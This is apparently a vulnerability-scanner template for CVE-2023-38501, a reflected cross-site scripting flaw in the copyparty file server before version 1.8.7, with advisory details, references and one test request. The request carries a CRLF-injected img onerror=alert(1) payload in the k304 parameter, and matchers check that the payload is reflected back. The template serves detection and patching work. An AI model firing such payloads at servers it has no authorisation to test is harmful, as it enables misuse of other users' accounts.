id: CVE-2023-38501
info:
  name: copyparty v1.8.6 - Cross-Site Scripting
  author: ctflearner
  severity: medium
  description: >
    copyparty is file server software. Prior to version 1.8.7, the
    application contains a reflected cross-site scripting via URL-parameter
    `?k304=...` and `?setck=...`. The worst-case outcome of this is being able
    to move or delete existing files on the server, or upload new files, using
    the account of the person who clicks the malicious link. It is recommended
    to change the passwords of one's copyparty accounts, unless one have
    inspected one's logs and found no trace of attacks. Version 1.8.7 contains a
    patch for the issue.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38501
    - https://www.exploit-db.com/exploits/51635
    - https://packetstormsecurity.com/files/173821/Copyparty-1.8.6-Cross-Site-Scripting.html
    - https://github.com/9001/copyparty/commit/007d948cb982daa05bc6619cd20ee55b7e834c38
    - https://github.com/9001/copyparty/security/advisories/GHSA-f54q-j679-p9hh
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-38501
    cwe-id: CWE-79
    cpe: cpe:2.3:a:copyparty_project:copyparty:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
  tags: copyparty,cve,cve2023,Reflected-xss
http:
  - method: GET
    path:
      - "{{BaseURL}}/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(\
        1)%3E"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <img+src=copyparty+onerror=alert(1)>
        condition: and
      - type: word
        part: header
        words:
          - text/html
      - type: status
        status:
          - 200
